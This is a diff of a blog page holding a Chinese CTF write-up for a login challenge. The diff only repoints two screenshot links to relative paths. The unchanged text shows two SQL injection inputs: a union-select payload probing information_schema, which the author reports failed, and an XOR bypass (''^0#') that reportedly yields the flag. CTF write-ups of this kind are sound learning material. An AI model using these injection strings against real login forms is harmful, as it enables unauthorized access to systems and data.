@@ -170,11 +170,11 @@
 <li><strong>题目</strong>：登陆就有 flag</li>
 </ul>
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="第一步：尝试联合查询注入"><a href="#第一步：尝试联合查询注入" class="headerlink" title="第一步：尝试联合查询注入"></a>第一步：尝试联合查询注入</h3><p>打开题目页面，发现是一个登录表单。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/BHNK-web/BHNK-web.github.io@main/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-10-19%20202757.png" alt="登录页面截图" loading='lazy'></p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-10-19%20202757.png" alt="登录页面截图" loading='lazy'></p>
 <p>尝试使用联合查询注入获取表信息：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = &#x27;</span>登录就有flag<span class="string">&#x27;),3 limit 1,2;#--</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/BHNK-web/BHNK-web.github.io@main/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-10-19%20203013.png" alt="注入尝试截图" loading='lazy'></p>
+<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-10-19%20203013.png" alt="注入尝试截图" loading='lazy'></p>
 <p>查询未找到目标表。</p>
 <h3 id="第二步：异或绕过"><a href="#第二步：异或绕过" class="headerlink" title="第二步：异或绕过"></a>第二步：异或绕过</h3><p>常规注入失效后，尝试使用 <code>&#39;^0#</code> 进行异或运算绕过：</p>
 <p>输入后成功获取 flag。</p>
